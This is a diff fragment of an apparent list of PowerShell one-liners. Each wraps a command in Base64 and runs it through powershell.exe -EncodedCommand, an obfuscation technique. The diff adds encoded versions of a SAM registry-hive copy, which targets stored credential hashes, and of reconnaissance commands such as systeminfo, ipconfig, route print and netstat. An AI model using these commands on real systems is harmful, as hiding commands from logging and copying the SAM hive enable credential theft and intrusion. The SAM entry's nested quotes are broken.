@@ -31,16 +31,16 @@
 
 - `$command = "Get-ChildItem -Path C:\ -Include _.txt,_.ini -File -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'YourSearchString'"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`
 
-- `$command = ""; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`
+- `$command = "Copy-Item -Path "$env:SystemRoot\System32\Config\RegBack\SAM" -Destination 'C:\Path\To\NewLocation\SAM'"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`
+
+- `$command = "systeminfo"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`
+
+- `$command = "ipconfig /all"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`
+
+- `$command = "route print"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`
+
+- `$command = "netstat -ano"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`
 
 - `$command = ""; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`
 
 - `$command = ""; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`
-
-- `$command = ""; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`
-
-- `Copy-Item -Path "$env:SystemRoot\System32\Config\RegBack\SAM" -Destination "C:\Path\To\NewLocation\SAM"`
-- `systeminfo`
-- `ipconfig /all`
-- `route print`
-- `netstat -ano`
